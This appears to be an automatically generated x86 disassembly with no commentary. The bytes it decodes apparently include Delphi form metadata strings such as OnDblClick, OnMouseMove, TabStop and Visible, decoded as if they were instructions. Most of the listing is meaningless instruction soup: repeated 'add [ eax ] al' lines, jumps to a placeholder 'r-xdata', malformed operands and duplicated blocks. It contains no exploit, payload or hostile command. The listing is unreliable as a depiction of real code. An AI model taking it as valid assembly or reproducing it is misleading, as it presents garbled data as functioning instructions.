imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
dec [ eax + 0x1004405 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
jae r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
mov ah 0x43
add [ eax + 0x446d ] al
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
add bh bh
mov eax 0xc8004404
add al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9424cf4
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
push edi
jb r-xdata
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
sub [ ebx + eax * 2 ] dh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
in al 0x2
inc esp
add [ eax + 0x24 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jo r-xdata
adc [ eax ] al
0x38ff0000 0x4405
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
outsb
cwde
mov bl 0x43
add [ ebp ] bl
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov ah 0x43
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
outsb
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
outsb
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
insd
inc esp
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0x54ff0001
insd
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
dec ebx
jns r-xdata
dec esp
jns r-xdata
jo r-xdata
inc ecx
jns r-xdata
adc [ eax ] al
push edi
add [ eax ] al
jmp esp
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
call [ eax + 0x4dc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
hlt
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
mov bh 0x43
add al bl
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push eax
mov ebp 0x1300043
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
mov bh 0x43
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add bh bh
jl r-xdata
loopne r-xdata
jo r-xdata
mov dh 0x43
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
jns r-xdata
jb r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebp
outsb
inc esp
jb r-xdata
mov esp 0x80043b8
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
inc esp
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add al bl
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
dec ebp
outsd
jne r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
loopne r-xdata
jns r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
push ebx
je r-xdata
push ebp
jo r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
popad
outsb
popad
jb r-xdata
outsb
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
adc ch [ edx + 0x56 ]
imul esi [ edx + 0x74 ] 0x4f6c6175
jb r-xdata
add [ eax ] al
mov al [ 0xffffffffd80043b6 ]
insb
or [ gs : edx + 0x56 ] ebp
imul esi [ edx + 0x74 ] 0x126c6175
insb
bound edx [ esi + 0x69 ]
outsd
js r-xdata
push ebx
je r-xdata
dec edi
outsb
sub [ esi + 0xe00043 ] dh
add bh bh
add [ eax ] al
jmp eax
add al 0xb7
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
popad
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsd
outsb
je r-xdata
outsb
or [ edi ] al
adc [ edx + 0x4f ] ch
ja r-xdata
dec edi
inc ebx
add [ eax ] cl
andps xmm1 [ edx + eax * 2 + 0x47 ]
jb r-xdata
jb r-xdata
adc eax 0x47424c54
je r-xdata
jb r-xdata
je r-xdata
inc esp
jb r-xdata
jne r-xdata
ja r-xdata
popad
je r-xdata
add [ eax ] eax
push ebx
je r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
js r-xdata
outsd
outsb
je r-xdata
jb r-xdata
hlt
popad
je r-xdata
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
ja r-xdata
popad
jb r-xdata
inc esp
outsd
push 0x65
popad
je r-xdata
je r-xdata
jb r-xdata
inc ebx
je r-xdata
jb r-xdata
nop
in al dx
dec esi
add [ eax + edx + 0x40 ] dl
add ah dh
adc [ eax ] al
insb
dec edi
je r-xdata
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
call 0xa439257
insb
bound edx [ ebx + 0x74 ]
popad
in al dx
imul ebp [ esi + 0x67 ] 0x72745306
outsb
outsd
insb
add [ 0x65646e49 ] al
or [ edx ] ecx
inc esp
dec ecx
outsb
je r-xdata
popad
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
outsb
inc ebp
je r-xdata
push esp
dec esp
inc edx
inc edi
imul edi [ eax + 0x65 ] 0x626c1364
dec edi
ja r-xdata
inc esp
popad
bound ebp [ ebp + 0x9 ]
insb
bound edx [ esi + 0x69 ]
jb r-xdata
push edx
inc ebx
add [ edx + eax ] bh
add [ eax ] cl
rol [ ebx ] 0x1
dec eax
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
outsb
je r-xdata
inc esp
popad
je r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x76 ] si
outsb
je r-xdata
jb r-xdata
lea eax [ eax ]
mov esp 0x800434f
ja r-xdata
inc ebp
jbe r-xdata
insb
jae r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax - 0x72 ] bh
inc ebx
add [ edi - 0x706fffbc ] dh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x6000443f ] ah
nop
inc ebx
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
inc esp
xor al [ eax ]
les eax [ ebx + eax * 2 + 0x4476fc00 ]
adc [ eax ] al
add [ eax + ecx * 8 + 0x43 ] al
add ah dh
adc [ eax ] al
lea eax [ eax ]
rcl [ eax + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ ecx + 0x43 ] 0x0
push eax
push edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
push ecx
inc ebx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
inc esp
jb r-xdata
jb r-xdata
arpl [ eax + eax + 0x44 ] si
enter 0x43 0x54
adc [ eax ] al
test [ ecx ] dl
inc eax
add [ ebx + 0x435020c0 ] cl
dec edi
bound ebp [ edx + 0x65 ]
pop es
dec ecx
outsb
je r-xdata
jb r-xdata
popad
je r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
add ecx [ eax ]
pop es
inc ebx
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ gs : edi + eax + 0x54 ] si
push es
inc eax
add [ ebp + 0x4fbc0040 ] cl
inc ebx
add [ eax ] cl
jne r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add ah bl
nop
inc ebx
add ah ch
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
add cl [ eax ]
pop es
add [ edx ] bh
add [ eax ] al
rcl [ ecx + 0x43 ] cl
inc ebp
jbe r-xdata
add al 0x44
mov eax eax
push ebx
inc ebx
add [ ebx ] al
or eax 0x73694c54
je r-xdata
shl [ edi + ecx * 2 + 0x43 ] 0x0
or [ edi ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
sbb al 0x2
add [ eax ] al
adc [ eax ] eax
mov [ ecx ] eax
mov al [ ecx ]
sldt [ 0x2bbd1100 ]
mov esp 0x201bc2c
adc [ eax - r--data ] dh
mov dl 0xff
mov cl 0xff
mov edx 0xafffb0ff
[ esi + 0x438bacff ]
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add al dh
mov [ ebx ] al
mov ah 0x88
inc ebx
add [ eax ] dh
mov [ ebx ] eax
or al 0x85
inc ebx
add [ esi + eax * 4 ] dh
inc ebx
add [ eax - 0x7a ] al
inc ebx
add [ eax - 0x4fffbc7a ] cl
xchg [ ebx ] eax
mov [ ebx - 0x6993ffbc ] bh
inc ebx
add [ ecx + ecx * 4 ] dl
inc ebx
add [ edx + ecx * 4 ] bl
inc ebx
add [ eax ] bl
xchg esp eax
inc ebx
add [ edx * 4 + 0xe0043 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
arpl [ edi + eax + 0x54 ] si
or al [ ecx + 0x74 ]
popad
jbe r-xdata
jb r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x42 ] dl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
adc [ eax ] eax
mov eax eax
and [ eax + 0x43 ] dl
imul ebp [ esi + 0x67 ] 0x43c84400
push ebx
je r-xdata
insb
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah al
test [ ebx ] al
cld
jbe r-xdata
xor al 0x40
add [ edi + eax * 2 ] ah
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
js r-xdata
ja r-xdata
outsd
insb
add [ edx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x69727453
outsb
push es
push ebx
je r-xdata
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0xd8004203
add [ ebx ] 0x10
jb r-xdata
imul ebp [ esi + 0x67 ] 0x746e4907
sub_434c89
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
mov esp 0x80043b8
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
dec esp
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
loopne r-xdata
jns r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
mov bh 0x43
add al bl
add [ eax + 0x4f07002b ] al
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
loopne r-xdata
jo r-xdata
mov dh 0x43
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
popad
inc esp
jb r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
insb
or [ gs : edx + 0x56 ] ebp
imul esi [ edx + 0x74 ] 0x126c6175
insb
bound edx [ esi + 0x69 ]
outsd
js r-xdata
dec edi
outsb
sub [ esi + 0xe00043 ] dh
add bh bh
add [ eax ] al
jmp eax
add al 0xb7
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add al bl
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
jo r-xdata
adc eax 0x47424c54
je r-xdata
jne r-xdata
popad
je r-xdata
ja r-xdata
adc ch [ edx + 0x56 ]
imul esi [ edx + 0x74 ] 0x4f6c6175
jb r-xdata
add [ eax ] eax
push ebx
je r-xdata
push ebp
jo r-xdata
push ebx
je r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
push eax
mov ebp 0x1300043
mov bh 0x43
push 0x65
popad
je r-xdata
add [ eax + edx + 0x40 ] dl
add ah dh
adc [ eax ] al
insb
dec edi
jb r-xdata
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
call 0xa439257
insb
bound edx [ ebx + 0x74 ]
popad
je r-xdata
inc esp
jb r-xdata
popad
outsb
popad
jb r-xdata
outsb
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
add [ eax ] al
mov al [ 0xffffffffd80043b6 ]
push edx
inc ebx
add [ edx + eax ] bh
add [ eax ] cl
rol [ ebx ] 0x1
dec eax
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
outsb
je r-xdata
inc esp
popad
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x76 ] si
outsb
je r-xdata
jb r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
or [ edi ] al
adc [ edx + 0x4f ] ch
ja r-xdata
inc ebx
je r-xdata
jb r-xdata
nop
in al dx
dec esi
outsd
outsb
je r-xdata
je r-xdata
outsb
dec edi
inc ebx
add [ eax ] cl
andps xmm1 [ edx + eax * 2 + 0x47 ]
jb r-xdata
jb r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add ah bl
nop
inc ebx
add ah ch
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
add cl [ eax ]
pop es
add [ eax ] al
rcl [ ecx + 0x43 ] cl
inc ebp
jbe r-xdata
add ecx [ eax ]
pop es
inc ebx
je r-xdata
jb r-xdata
lea eax [ eax ]
mov esp 0x800434f
ja r-xdata
js r-xdata
outsd
outsb
je r-xdata
jb r-xdata
inc ebp
jbe r-xdata
insb
jae r-xdata
push ebx
je r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
hlt
popad
je r-xdata
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
ja r-xdata
popad
jb r-xdata
inc esp
outsd
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
sbb al 0x2
add [ eax ] al
adc [ eax ] eax
mov [ ecx ] eax
mov al [ ecx ]
sldt [ 0x2bbd1100 ]
mov esp 0x201bc2c
adc [ eax - r--data ] dh
mov dl 0xff
mov cl 0xff
mov edx 0xafffb0ff
[ esi + 0x438bacff ]
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add al dh
mov [ ebx ] al
mov ah 0x88
inc ebx
add [ eax ] dh
mov [ ebx ] eax
or al 0x85
inc ebx
add [ esi + eax * 4 ] dh
inc ebx
add [ eax - 0x7a ] al
inc ebx
add [ eax - 0x4fffbc7a ] cl
xchg [ ebx ] eax
mov [ ebx - 0x6993ffbc ] bh
inc ebx
add [ ecx + ecx * 4 ] dl
inc ebx
add [ edx + ecx * 4 ] bl
inc ebx
add [ eax ] bl
xchg esp eax
inc ebx
add [ edx * 4 + 0xe0043 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax - 0x72 ] bh
inc ebx
add [ edi - 0x706fffbc ] dh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x6000443f ] ah
nop
inc ebx
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah al
test [ ebx ] al
cld
jbe r-xdata
xor al 0x40
add [ edi + eax * 2 ] ah
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
arpl [ eax + eax + 0x44 ] si
enter 0x43 0x54
adc [ eax ] al
test [ ecx ] dl
inc eax
add [ ebx + 0x435020c0 ] cl
dec edi
bound ebp [ edx + 0x65 ]
inc esp
popad
je r-xdata
add al 0x44
mov eax eax
push ebx
or [ edx ] ecx
inc esp
dec ecx
outsb
je r-xdata
popad
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
je r-xdata
outsb
inc ebx
add [ ebx ] al
or eax 0x73694c54
je r-xdata
je r-xdata
shl [ edi + ecx * 2 + 0x43 ] 0x0
or [ edi ] cl
inc esp
in al dx
imul ebp [ esi + 0x67 ] 0x72745306
outsb
outsd
insb
add [ 0x65646e49 ] al
inc ebp
push esp
dec esp
inc edx
inc edi
imul edi [ eax + 0x65 ] 0x626c1364
dec edi
ja r-xdata
popad
bound ebp [ ebp + 0x9 ]
insb
bound edx [ esi + 0x69 ]
jb r-xdata
xor al [ eax ]
les eax [ ebx + eax * 2 + 0x4476fc00 ]
outsd
insb
add [ edx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x69727453
outsb
push es
push ebx
je r-xdata
add [ edx ] bh
adc [ eax ] al
add [ eax + ecx * 8 + 0x43 ] al
add ah dh
adc [ eax ] al
lea eax [ eax ]
rcl [ eax + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ ecx + 0x43 ] 0x0
push eax
push edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
push ecx
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ gs : edi + eax + 0x54 ] si
push es
pop es
dec ecx
outsb
je r-xdata
jb r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
inc esp
jb r-xdata
jb r-xdata
inc eax
add [ ebp + 0x4fbc0040 ] cl
inc ebx
add [ eax ] cl
jne r-xdata
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0xd8004203
add [ ebx ] 0x10
jb r-xdata
imul ebp [ esi + 0x67 ] 0x746e4907
add [ eax ] cl
adc [ esp + ecx * 2 + 0x42 ] dl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
adc [ eax ] eax
mov eax eax
and [ eax + 0x43 ] dl
imul ebp [ esi + 0x67 ] 0x43c84400
arpl [ edi + eax + 0x54 ] si
or al [ ecx + 0x74 ]
popad
jbe r-xdata
jb r-xdata
push ebx
je r-xdata
insb
js r-xdata
ja r-xdata
sub_4359dd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070029 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
mov esp 0x80043b8
push eax
outsd
jo r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc esp
outsd
ja r-xdata
outsb
jb r-xdata
add [ eax ] al
add [ eax + 0x4f090032 ] al
outsb
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
sub [ bp + 0x43 ] dh
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002e ] al
jo r-xdata
mov [ ebp + 0x43 ] bh
add [ edi + ebp * 4 + 0x41 ] bh
jb r-xdata
mov al [ 0xffffffffd80043b6 ]
add [ eax ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ecx ] cl
dec edi
outsb
inc ebp
outsb
inc esp
jb r-xdata
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
add [ ebp + edi * 2 + 0x43 ] ch
add [ esi + edi * 2 + 0x43 ] bl
add ah bl
scasd [ edi ]
inc ecx
add al dh
pop esp
inc ebx
push ebp
jo r-xdata
add [ eax + 0x4f0a002d ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
